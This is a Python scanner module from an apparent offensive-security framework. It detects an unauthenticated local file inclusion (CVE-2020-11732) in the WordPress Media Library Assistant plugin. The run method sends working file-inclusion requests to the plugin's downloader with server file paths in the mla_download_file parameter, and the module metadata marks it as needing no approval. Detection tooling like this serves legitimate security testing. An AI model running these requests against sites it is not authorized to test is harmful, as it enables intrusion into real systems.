#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Media Library Assistant plugin for WordPress before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Media Library Assistant < 2.82 - Unauthenticated Limited Local File Inclusion Detection',
        'description': 'Media Library Assistant plugin for WordPress before 2.82 contains a local file inclusion caused by unsanitized mla_gallery link parameter, letting attackers include arbitrary local files, exploit requires access to the vulnerable link.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'wpscan', 'cve2020', 'wordpress', 'wp', 'wp-plugin', 'media-library-assistant', 'unauth', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/80d60584-fa03-407e-a7bd-32d507a1046d/'],
        'cve': 'CVE-2020-11732',
    }

    def run(self):
        for path in ('/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/var/www/html/wordpress/wp-content/index.php', '/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/var/www/html/wp-content/index.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('// Silence is golden.',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='high',
                    reason="Media Library Assistant < 2.82 - Unauthenticated Limited Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

